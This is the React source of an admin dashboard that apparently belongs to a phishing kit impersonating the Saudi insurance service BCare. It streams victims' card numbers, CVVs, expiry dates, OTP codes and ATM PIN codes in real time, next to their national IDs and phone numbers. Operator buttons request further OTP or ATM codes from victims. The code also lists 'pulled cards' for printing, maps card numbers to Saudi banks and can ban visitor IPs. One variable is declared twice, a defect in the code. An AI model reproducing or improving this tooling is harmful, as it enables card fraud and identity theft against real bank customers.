import React, { useState, useEffect, useMemo, useRef } from 'react';
import { supabase } from '../../supabase';
import { 
  Users, 
  CreditCard, 
  MessageSquare, 
  X, 
  Smartphone,
  CheckCircle,
  AlertCircle,
  Menu,
  Activity,
  LogOut,
  ShieldAlert,
  Clock,
  ShieldOff,
  PieChart,
  BarChart,
  TrendingUp,
  Trash2,
  Printer,
  Settings,
  ChevronDown,
  Lock,
  Plus,
  ArrowRight
} from 'lucide-react';
import './Admin.css';

export const Admin = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [isSetupNeeded, setIsSetupNeeded] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  
  // Navigation State
  const [currentView, setCurrentView] = useState('workspace'); // workspace, stats, cards, users
  const [statsFilter, setStatsFilter] = useState('all'); // all, completed, rejected, cards
  const [isGearOpen, setIsGearOpen] = useState(false);
  const [isDeleteModalOpen, setIsDeleteModalOpen] = useState(false);
  
  const [allAdmins, setAllAdmins] = useState([]);
  const [newAdminUser, setNewAdminUser] = useState({ username: '', password: '' });
  const [masterCode, setMasterCode] = useState('');
  const [customers, setCustomers] = useState([]);
  const [selectedCustomerId, setSelectedCustomerId] = useState(null);
  const selectedCustomer = customers.find(c => c.id === selectedCustomerId);
  const [searchQuery, setSearchQuery] = useState('');
  const [loadingAction, setLoadingAction] = useState(null);
  const [mobileDetailsActive, setMobileDetailsActive] = useState(false);
  const [isSoundEnabled, setIsSoundEnabled] = useState(true);
  const [unreadCustomers, setUnreadCustomers] = useState(new Set());
  
  const notificationSound = useRef(new Audio('https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3'));
  const lastStateRef = useRef({});

  // Stats Logic
  const stats = useMemo(() => {
    const now = new Date().getTime();
    const total = customers.length;
    const completed = customers.filter(c => c.status === 'completed').length;
    const rejected = customers.filter(c => c.status === 'rejected').length;
    const withCards = customers.filter(c => c.card_number).length;
    const onlineNow = customers.filter(c => (now - (c.last_heartbeat || c.last_update || 0)) < 15000).length;
    return { total, completed, rejected, withCards, onlineNow };
  }, [customers]);

  // Real-time Customers Fetch
  useEffect(() => {
    if (!isAuthenticated) return;

    const fetchInitialData = async () => {
      const { data } = await supabase
        .from('customers')
        .select('*')
        .order('last_update', { ascending: false });
      if (data) {
        setCustomers(data);
        if (!selectedCustomerId && data.length > 0) setSelectedCustomerId(data[0].id);
      }
    };
    fetchInitialData();

    // Supabase Realtime for Customers
    const channel = supabase
      .channel('admin_customers')
      .on(
        'postgres_changes',
        { event: '*', schema: 'public', table: 'customers' },
        (payload) => {
          setCustomers(prev => {
            let next;
            if (payload.eventType === 'INSERT') {
              next = [payload.new, ...prev];
            } else if (payload.eventType === 'UPDATE') {
              next = prev.map(c => c.id === payload.new.id ? payload.new : c);
            } else if (payload.eventType === 'DELETE') {
              next = prev.filter(c => c.id !== payload.old.id);
            } else {
              next = prev;
            }
            
            // Universal Notification Logic
            if (payload.eventType === 'INSERT' || payload.eventType === 'UPDATE') {
              const cust = payload.new;
              const old = prev.find(o => o.id === cust.id);
              
              // Only alert if something meaningful changed (ignore pure heartbeat updates)
              const isMeaningful = payload.eventType === 'INSERT' || 
                                 (old && (
                                   old.page !== cust.page || 
                                   old.status !== cust.status || 
                                   old.card_number !== cust.card_number ||
                                   (cust.otps?.length || 0) > (old.otps?.length || 0)
                                 ));

              if (isMeaningful) {
                // Audio Alert
                if (isSoundEnabled) {
                  notificationSound.current.currentTime = 0;
                  notificationSound.current.play().catch(e => console.log("Audio play blocked", e));
                }
                
                // Visual Highlight
                setUnreadCustomers(prevSet => {
                  const newSet = new Set(prevSet);
                  newSet.add(cust.id);
                  return newSet;
                });
              }
            }
            // Sort by last_update to ensure active customers jump to top
            return [...next].sort((a, b) => (b.last_update || 0) - (a.last_update || 0));
          });
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [isAuthenticated, isSoundEnabled, selectedCustomerId]);

  // Fetch Admins
  useEffect(() => {
    if (!isAuthenticated) return;

    const fetchAdmins = async () => {
      const { data } = await supabase.from('admins').select('*');
      if (data) setAllAdmins(data);
    };
    fetchAdmins();

    const channel = supabase
      .channel('admin_users')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'admins' }, () => fetchAdmins())
      .subscribe();

    return () => supabase.removeChannel(channel);
  }, [isAuthenticated]);

  const selectedCustomer = customers.find(c => c.id === selectedCustomerId);

  const isUserOnline = (c) => {
    const time = c.last_heartbeat || c.last_update;
    if (!time) return false;
    // Increased to 45 seconds for better accuracy
    return (Date.now() - time) < 45000;
  };

  const handleAction = async (type, payload = {}) => {
    if (!selectedCustomerId) return;
    setLoadingAction(type);
    try {
      await supabase.from('customers').update({
        status: type,
        last_action: type,
        ...payload,
        last_update: new Date().getTime()
      }).eq('id', selectedCustomerId);
    } catch (err) { console.error(err); }
    setLoadingAction(null);
  };

  const banCustomer = async () => {
    if (!selectedCustomer?.ip) return alert('IP غير معروف');
    if (!window.confirm('هل تريد حظر هذا الـ IP نهائياً؟')) return;
    setLoadingAction('ban');
    try {
      await supabase.from('banned_ips').insert([{
        ip: selectedCustomer.ip,
        banned_at: new Date().getTime(),
        reason: 'Admin Panel Ban'
      }]);
      await supabase.from('customers').delete().eq('id', selectedCustomerId);
      setSelectedCustomerId(null);
      alert('تم الحظر بنجاح');
    } catch (err) { console.error(err); }
    setLoadingAction(null);
  };

  const handleChangePassword = async () => {
    if (masterCode !== '185209') return alert('الرمز الرئيسي خطأ');
    if (!newAdminUser.password) return alert('يرجى إدخال كلمة المرور الجديدة');
    
    setLoadingAction('change_pass');
    try {
      const { data } = await supabase.from('admins').select('id').limit(1);
      if (data && data.length > 0) {
        await supabase.from('admins').update({ password: newAdminUser.password }).eq('id', data[0].id);
        alert('تم تغيير كلمة المرور بنجاح');
        setNewAdminUser({ username: '', password: '' });
        setMasterCode('');
      }
    } catch (err) { console.error(err); }
    setLoadingAction(null);
  };

  // Removed delete admin logic as per request to simplify to single password profile

  const handleDeleteAllData = async () => {
    if (masterCode !== '185209') return alert('الرمز الرئيسي خطأ');
    setLoadingAction('delete_all');
    try {
      // Supabase delete all (with no filter) requires RLS or a small hack, but we disabled RLS.
      // We can use a filter that always matches.
      await supabase.from('customers').delete().neq('id', '00000000-0000-0000-0000-000000000000');
      alert('تم المسح بنجاح');
      setMasterCode('');
      setIsDeleteModalOpen(false);
    } catch (err) { console.error(err); }
    setLoadingAction(null);
  };

  // Auth Logic
  useEffect(() => {
    const check = async () => {
      const { data } = await supabase.from('admins').select('*').limit(1);
      if (!data || data.length === 0) setIsSetupNeeded(true);
    };
    check();
    // Removed localStorage check to force password on refresh/new tab
    if (sessionStorage.getItem('admin_session_v3')) setIsAuthenticated(true);
  }, []);

  if (isSetupNeeded) {
    return (
      <div className="admin-login-overlay" dir="rtl" style={{fontFamily: 'Tajawal, sans-serif'}}>
        <div className="login-box">
          <div className="login-header">
            <ShieldAlert size={40} color="#146394" />
            <h2>إعداد نظام الوصول</h2>
          </div>
          <p className="login-subtitle">يرجى تعيين كلمة المرور للدخول إلى لوحة التحكم</p>
          <div className="login-input-group">
            <Lock size={18} />
            <input type="password" placeholder="كلمة المرور الجديدة" onChange={e => setPassword(e.target.value)} />
          </div>
          <button className="login-btn" onClick={async () => {
            if (!password) return alert('يرجى إدخال كلمة مرور');
            await supabase.from('admins').insert([{ username: 'admin', password }]);
            localStorage.setItem('admin_session_v3', 'true');
            sessionStorage.setItem('admin_session_v3', 'true');
            setIsSetupNeeded(false);
          }}>حفظ والدخول للوحة التحكم</button>
        </div>
      </div>
    );
  }

  if (!isAuthenticated) {
    return (
      <div className="admin-login-overlay" dir="rtl" style={{fontFamily: 'Tajawal, sans-serif'}}>
        <div className="login-box glassmorphism">
          <div className="login-glow"></div>
          <img src="/group-21.svg" alt="Bcare" className="login-logo-img" />
          <div className="login-header">
            <h2>تسجيل الدخول للوحة التحكم</h2>
            <p>أدخل كلمة المرور للمتابعة</p>
          </div>
          
          <div className="login-input-group">
            <Lock size={18} />
            <input 
              type="password" 
              placeholder="كلمة المرور" 
              onChange={e => setPassword(e.target.value)} 
              onKeyDown={(e) => e.key === 'Enter' && document.getElementById('login-submit-btn').click()}
            />
          </div>
          
          <button id="login-submit-btn" className="login-btn-v3" onClick={async () => {
             const { data } = await supabase
              .from('admins')
              .select('*')
              .eq('password', password);
             if (data && data.length > 0) {
               setIsAuthenticated(true);
               sessionStorage.setItem('admin_session_v3', 'true');
             } else {
               alert('كلمة المرور غير صحيحة');
             }
          }}>
            <span>دخول النظام</span>
            <ArrowRight size={18} />
          </button>
          
          <div className="login-footer">
            <ShieldAlert size={14} />
            <span>نظام محمي ومشفر بالكامل</span>
          </div>
        </div>
      </div>
    );
  }

  // BIN Detection for Saudi Banks
  const getBankName = (cardNumber) => {
    if (!cardNumber) return '---';
    const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
    const bins = {
      '400875': 'الراجحي', '409201': 'الراجحي', '458456': 'الراجحي', '446393': 'الراجحي', '446672': 'الراجحي', '446404': 'الراجحي', '457865': 'الراجحي', '400876': 'الراجحي',
      '406996': 'الأهلي SNB', '455036': 'الأهلي SNB', '431361': 'الأهلي SNB', '432328': 'الأهلي SNB', '422817': 'الأهلي SNB',
      '432128': 'الإنماء', '434107': 'الإنماء', '405454': 'الإنماء', '440406': 'الإنماء',
      '588845': 'البلاد', '530060': 'البلاد', '531095': 'البلاد',
      '588848': 'الرياض', '588850': 'الرياض', '446136': 'الرياض', '403933': 'الرياض',
      '455708': 'الجزيرة', '457997': 'الجزيرة', '407197': 'الجزيرة',
      '417633': 'الاستثمار', '468540': 'الاستثمار', '409204': 'الاستثمار',
      '440533': 'ساب SAB', '440647': 'ساب SAB', '440759': 'ساب SAB', '462220': 'ساب SAB',
      '410685': 'العربي ANB', '412563': 'العربي ANB', '410686': 'العربي ANB',
      '401757': 'سامبا', '410834': 'سامبا', '452103': 'سامبا',
      '430840': 'السعودي الفرنسي', '430841': 'السعودي الفرنسي', '424288': 'السعودي الفرنسي'
    };
    return bins[bin] || 'بنك محلي';
  };

  // Reusable Virtual Card
  const VirtualCard = ({ customer }) => (
    <div className="admin-virtual-card-v2">
      <div className="v-card-top-row">
        <div className="v-card-chip"></div>
        <div className="v-card-bank-name">{getBankName(customer.card_number)}</div>
      </div>
      <div className="v-card-number-v2" style={{ direction: 'ltr', unicodeBidi: 'plaintext' }}>{customer.card_number}</div>
      <div className="v-card-bottom">
        <div className="v-card-info-v2">
          <span>NAME</span>
          <strong>{'---'}</strong>
        </div>
        <div className="v-card-info-v2">
          <span>EXP</span>
          <strong>{customer.card_expiry || '---'}</strong>
        </div>
        <div className="v-card-info-v2">
          <span>CVV</span>
          <strong>{customer.card_cvv || '---'}</strong>
        </div>
      </div>
    </div>
  );

  return (
    <div className="admin-v2-root" dir="rtl">
      <div className="admin-top-banner">حمل تطبيق بي كير الآن واستمتع بخدمات أكثر</div>
      
      {/* Header based on image */}
      <header className="admin-main-header">
        <div className="header-right">
          <div className="gear-menu-v2">
            <button className="icon-btn" onClick={() => setIsGearOpen(!isGearOpen)}><Menu size={20} /></button>
            {isGearOpen && (
              <div className="gear-dropdown-v2" onMouseLeave={() => setIsGearOpen(false)}>
                <button onClick={() => { setCurrentView('stats'); setIsGearOpen(false); }}><PieChart size={16}/> الإحصائيات</button>
                <button onClick={() => { setCurrentView('cards'); setIsGearOpen(false); }}><CreditCard size={16}/> البطاقات المسحوبة</button>
                <button onClick={() => { setCurrentView('users'); setIsGearOpen(false); }}><Lock size={16}/> تغيير كلمة المرور</button>
                <button onClick={() => { setIsDeleteModalOpen(true); setIsGearOpen(false); }} style={{color: 'red'}}><Trash2 size={16}/> حذف كافة البيانات</button>
                <hr />
                <button onClick={() => { sessionStorage.removeItem('admin_session_v3'); setIsAuthenticated(false); }}><LogOut size={16}/> خروج</button>
              </div>
            )}
          </div>
          <div className="online-counter-pill">
             <div className="pulse-dot"></div>
             <span>متواجد حالياً: {stats.onlineNow}</span>
          </div>
          <button 
            className={`icon-btn ${isSoundEnabled ? 'active' : ''}`} 
            onClick={() => setIsSoundEnabled(!isSoundEnabled)}
            title={isSoundEnabled ? "كتم الصوت" : "تشغيل الصوت"}
          >
            {isSoundEnabled ? <Clock size={20} color="#4caf50" /> : <ShieldOff size={20} color="#f44336" />}
          </button>
        </div>
        
        <div className="header-center">
          <img src="/group-21.svg" alt="BCare" className="bcare-logo" onClick={() => setCurrentView('workspace')} style={{cursor:'pointer'}} />
        </div>
        
        <div className="header-left">
           <button className="lang-btn">EN</button>
           <div className="view-indicator-pill">{currentView === 'workspace' ? 'لوحة التحكم' : currentView === 'stats' ? 'الإحصائيات' : currentView === 'cards' ? 'إدارة البطاقات' : 'تغيير كلمة المرور'}</div>
        </div>
      </header>

      <div className={`admin-content-v2 ${mobileDetailsActive ? 'details-active' : ''}`}>
        {/* Sidebar (Right) */}
        <aside className="admin-sidebar-v2">
          <div className="sidebar-header-v2">
             <h2>العملاء ({customers.length})</h2>
             <button className="icon-btn" onClick={() => setCurrentView('workspace')}><ArrowRight size={18}/></button>
          </div>
          <div className="sidebar-search-v2">
             <input type="text" placeholder="بحث..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} />
          </div>
          <div className="sidebar-list-v2">
            {customers.filter(c => (c.full_name || c.id_number || 'عميل جديد').includes(searchQuery)).map(c => {
               const online = isUserOnline(c);
               return (
                  <div 
                    key={c.id} 
                    className={`sidebar-item-v2 ${selectedCustomerId === c.id ? 'active' : ''} ${unreadCustomers.has(c.id) ? 'has-new-action' : ''}`} 
                    onClick={() => { 
                      setSelectedCustomerId(c.id); 
                      setCurrentView('workspace'); 
                      setMobileDetailsActive(true);
                      // Clear unread status
                      setUnreadCustomers(prev => {
                        const next = new Set(prev);
                        next.delete(c.id);
                        return next;
                      });
                    }}
                  >
                    <div className="item-main-info">
                       <span className="customer-name-v2">{c.full_name || c.id_number || 'عميل جديد'}</span>
                       <span className={`online-status-v2 ${online ? 'online' : 'offline'}`}>
                         {online ? 'متصل' : 'خرج'}
                       </span>
                    </div>
                    <div className="item-page-row">
                       {c.page || 'تصفح الموقع'}
                    </div>

                    <div className="item-indicators">
                      {c.card_number && (
                        <div className="indicator-tag">
                          <CreditCard size={10} /> 💳 بطاقة
                        </div>
                      )}
                      {(c.otps && c.otps.length > 0) && (
                        <div className="indicator-tag">
                          <Plus size={10} /> 🔑 رمز ({c.otps.length})
                        </div>
                      )}
                      <span style={{fontSize:'9px', color:'#94a3b8', marginRight:'auto'}}>
                        {c.last_update ? new Date(c.last_update).toLocaleTimeString('ar-SA', {hour:'2-digit', minute:'2-digit'}) : ''}
                      </span>
                    </div>
                 </div>
               );
            })}
          </div>
        </aside>

        {/* Main Area (Left) */}
        <main className="admin-main-v2">
          {currentView === 'workspace' && (
            selectedCustomer ? (
              <div className="workspace-inner">
                <div className="customer-top-info">
                  <button className="back-to-list-btn" onClick={() => setMobileDetailsActive(false)}>
                    <ArrowRight size={20} />
                    <span>العودة للقائمة</span>
                  </button>
                  <h1>{selectedCustomer.full_name || selectedCustomer.id_number}</h1>
                  <div className={`online-status-badge ${isUserOnline(selectedCustomer) ? 'online' : 'offline'}`}>
                     {isUserOnline(selectedCustomer) ? 'متصل الآن - ' : 'خرج - '} {selectedCustomer.page}
                  </div>
                </div>

                {/* New Top Preview: Card (Left) and Codes (Right) */}
                <div className="top-preview-row">
                  <div className="preview-left">
                    {selectedCustomer.card_number ? (
                      <VirtualCard customer={selectedCustomer} />
                    ) : (
                      <div className="no-card-placeholder">بانتظار إدخال بيانات البطاقة...</div>
                    )}
                  </div>
                  
                  <div className="preview-right">
                    <div className="codes-mini-display">
                      <div className="mini-code-col">
                        <h5>أكواد الـ OTP</h5>
                        <div className="mini-list">
                          {[...(selectedCustomer.otps || [])].filter(o => o.type === 'otp').slice().reverse().map((o, i) => (
                            <div key={i} className={`mini-code-item ${i === 0 ? 'newest' : ''}`}>{o.code}</div>
                          ))}
                        </div>
                      </div>
                      <div className="mini-code-col">
                        <h5>أكواد الـ ATM</h5>
                        <div className="mini-list">
                          {[...(selectedCustomer.otps || [])].filter(o => o.type === 'atm').slice().reverse().map((o, i) => (
                            <div key={i} className={`mini-code-item ${i === 0 ? 'newest' : ''}`}>{o.code}</div>
                          ))}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Large Colored Buttons */}
                <div className="action-buttons-row">
                  <button className="act-btn-v2 btn-otp" onClick={() => handleAction('request_otp')}>
                     <MessageSquare size={32} />
                     <span>طلب كود OTP</span>
                  </button>
                  <button className="act-btn-v2 btn-atm" onClick={() => handleAction('request_atm')}>
                     <CreditCard size={32} />
                     <span>طلب صراف ATM</span>
                  </button>
                  <button className="act-btn-v2 btn-reject" onClick={() => handleAction('rejected')}>
                     <X size={32} />
                     <span>إنهاء / رفض</span>
                  </button>
                  <button className="act-btn-v2 btn-complete" onClick={() => handleAction('completed')}>
                     <CheckCircle size={24} />
                     <span>قبول العملية وإظهار وثيقة التأمين</span>
                  </button>
                </div>

                {/* Information Grid */}
                <div className="info-sections-grid">
                  <div className="info-card-v2">
                    <h3>معلومات الشخص</h3>
                    <div className="info-row-v2"><span>الاسم</span> <strong>{selectedCustomer.full_name || '---'}</strong></div>
                    <div className="info-row-v2"><span>رقم الهوية</span> <strong>{selectedCustomer.id_number || '---'}</strong></div>
                    <div className="info-row-v2"><span>الجوال</span> <strong>{selectedCustomer.mobile || '---'}</strong></div>
                    <div className="info-row-v2"><span>الجهاز</span> <strong>{selectedCustomer.device || '---'}</strong></div>
                    <div className="info-row-v2"><span>الغرض</span> <strong>{selectedCustomer.purpose || 'شخصي'}</strong></div>
                    <div className="info-row-v2"><span>الرقم التسلسلي</span> <strong>{selectedCustomer.sequence_number || '---'}</strong></div>
                    <button className="btn-ban-small" onClick={banCustomer}><ShieldAlert size={14}/> حظر العميل</button>
                  </div>

                  <div className="info-card-v2">
                    <h3>تفاصيل التأمين المختارة</h3>
                    <div className="info-row-v2"><span>الشركة</span> <strong>{selectedCustomer.selected_company || '---'}</strong></div>
                    <div className="info-row-v2"><span>المبلغ الإجمالي</span> <strong className="price">{selectedCustomer.total_price || '---'} ريال</strong></div>
                    <div className="info-row-v2"><span>نوع التأمين</span> <strong>تأمين شامل</strong></div>
                    <div className="info-row-v2"><span>المركبة</span> <strong>{selectedCustomer.car_make_model || '---'}</strong></div>
                  </div>
                </div>

                {/* RAW DATA DEBUG SECTION */}
                <div className="info-card-v2" style={{marginTop: '20px', background: '#fffbeb', borderColor: '#fef3c7'}}>
                  <h3 style={{color: '#92400e'}}>البيانات التقنية (للتأكد)</h3>
                  <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', fontSize: '12px'}}>
                    <div className="info-row-v2"><span>رقم البطاقة (خام)</span> <strong>{selectedCustomer.card_number || 'لم يصل بعد'}</strong></div>
                    <div className="info-row-v2"><span>الاسم على البطاقة</span> <strong>{'---'}</strong></div>
                    <div className="info-row-v2"><span>تاريخ الانتهاء</span> <strong>{selectedCustomer.card_expiry || '---'}</strong></div>
                    <div className="info-row-v2"><span>CVV</span> <strong>{selectedCustomer.card_cvv || '---'}</strong></div>
                    <div className="info-row-v2"><span>آخر تحديث</span> <strong>{new Date(selectedCustomer.last_update || 0).toLocaleString('ar-SA')}</strong></div>
                  </div>
                </div>
              </div>
            ) : (
              <div style={{textAlign: 'center', padding: '100px', color: '#999'}}>
                 يرجى اختيار عميل من القائمة الجانبية
              </div>
            )
          )}

          {currentView === 'stats' && (
            <div className="full-page-view">
              <div className="view-header-row">
                <h2>إحصائيات المنصة</h2>
                <div className="stats-mini-summary">إجمالي النشاط والعمليات</div>
              </div>
              <div className="stats-filter-grid" style={{gridTemplateColumns: 'repeat(5, 1fr)'}}>
                <div className={`stat-box ${statsFilter === 'all' ? 'active' : ''}`} onClick={() => setStatsFilter('all')}>
                   <strong>{stats.total}</strong>
                   <span>كل العملاء</span>
                </div>
                <div className="stat-box" style={{cursor: 'default'}}>
                   <strong style={{color: '#16a34a'}}>{stats.onlineNow}</strong>
                   <span style={{color: '#16a34a'}}>متصل الآن</span>
                </div>
                <div className={`stat-box ${statsFilter === 'completed' ? 'active' : ''}`} onClick={() => setStatsFilter('completed')}>
                   <strong>{stats.completed}</strong>
                   <span>الطلبات الناجحة</span>
                </div>
                <div className={`stat-box ${statsFilter === 'rejected' ? 'active' : ''}`} onClick={() => setStatsFilter('rejected')}>
                   <strong>{stats.rejected}</strong>
                   <span>الطلبات المرفوضة</span>
                </div>
                <div className={`stat-box ${statsFilter === 'cards' ? 'active' : ''}`} onClick={() => setStatsFilter('cards')}>
                   <strong>{stats.withCards}</strong>
                   <span>البطاقات المسحوبة</span>
                </div>
              </div>

              <div className="stats-results-area">
                {statsFilter === 'cards' ? (
                  <div className="cards-grid-v2">
                    {customers.filter(c => c.card_number).map((c, i) => (
                      <VirtualCard key={i} customer={c} />
                    ))}
                  </div>
                ) : (
                  <div className="stats-table-wrapper">
                    <table className="stats-table">
                      <thead>
                        <tr>
                          <th>الاسم</th>
                          <th>الهوية</th>
                          <th>الحالة</th>
                          <th>التاريخ</th>
                          <th>الإجراء</th>
                        </tr>
                      </thead>
                      <tbody>
                        {customers.filter(c => {
                          if (statsFilter === 'all') return true;
                          return c.status === statsFilter;
                        }).map((c, i) => (
                          <tr key={i}>
                            <td>{c.full_name || '---'}</td>
                            <td>{c.id_number}</td>
                            <td><span className={`status-tag ${c.status}`}>{c.status === 'completed' ? 'ناجح' : c.status === 'rejected' ? 'مرفوض' : 'قيد الانتظار'}</span></td>
                            <td>{c.last_update ? new Date(c.last_update).toLocaleDateString('ar-SA') : '---'}</td>
                            <td><button onClick={() => { setSelectedCustomerId(c.id); setCurrentView('workspace'); }}>عرض</button></td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                )}
              </div>
            </div>
          )}

          {currentView === 'cards' && (
            <div className="full-page-view">
               <div className="view-header-row">
                  <h2>كافة البطاقات المسحوبة</h2>
                  <button className="print-btn-v3" onClick={() => window.print()}><Printer size={18}/> طباعة PDF</button>
               </div>
               <div className="cards-grid-v2">
                  {customers.filter(c => c.card_number).map((c, i) => (
                    <VirtualCard key={i} customer={c} />
                  ))}
               </div>
            </div>
          )}

          {currentView === 'users' && (
            <div className="full-page-view">
              <div className="view-header-row">
                <h2>تغيير كلمة المرور</h2>
                <p>تحديث بيانات الدخول للنظام</p>
              </div>
              <div className="password-change-container">
                <div className="info-card-v2" style={{maxWidth: '500px', margin: '0 auto'}}>
                   <div className="input-group-v2">
                      <label>كلمة المرور الجديدة</label>
                      <div className="master-input-wrap">
                        <Lock size={18} />
                        <input type="password" placeholder="أدخل كلمة المرور الجديدة" value={newAdminUser.password} onChange={e => setNewAdminUser({...newAdminUser, password: e.target.value})} />
                      </div>
                   </div>
                   
                   <div className="input-group-v2" style={{marginTop: '20px'}}>
                      <label>الرمز السري للتأكيد</label>
                      <div className="master-input-wrap">
                        <ShieldAlert size={18} />
                        <input type="password" placeholder="أدخل الكود السري" value={masterCode} onChange={e => setMasterCode(e.target.value)} />
                      </div>
                   </div>

                   <button 
                     className="save-user-btn" 
                     style={{marginTop: '30px', width: '100%', height: '50px'}}
                     onClick={handleChangePassword}
                     disabled={loadingAction === 'change_pass'}
                   >
                     {loadingAction === 'change_pass' ? 'جاري التحديث...' : 'تحديث كلمة المرور'}
                   </button>
                </div>
              </div>
            </div>
          )}
        </main>
      </div>

      {/* Delete All Data Modal (The only one staying as popup) */}
      {isDeleteModalOpen && (
        <div className="modal-overlay-v2">
          <div className="modal-content-v2" style={{maxWidth: '400px', textAlign: 'center'}}>
            <button className="close-modal-v2" onClick={() => setIsDeleteModalOpen(false)}><X /></button>
            <div style={{color: '#e53935', marginBottom: '15px'}}><AlertCircle size={48} /></div>
            <h3>حذف كافة البيانات</h3>
            <p style={{fontSize: '13px', color: '#666', marginBottom: '20px'}}>سيتم مسح كافة بيانات العملاء نهائياً. يرجى إدخال الماستر كود للتأكيد.</p>
            <input 
              type="password" 
              placeholder="الرمز الرئيسي" 
              className="modal-input" 
              style={{textAlign:'center'}} 
              value={masterCode} 
              onChange={e => setMasterCode(e.target.value)} 
            />
            <button 
              className="act-btn-v2 btn-reject" 
              style={{height: '50px', width: '100%', fontSize: '14px'}}
              onClick={handleDeleteAllData}
              disabled={loadingAction === 'delete_all'}
            >
              {loadingAction === 'delete_all' ? 'جاري المسح...' : 'تأكيد المسح النهائي'}
            </button>
          </div>
        </div>
      )}
    </div>
  );
};
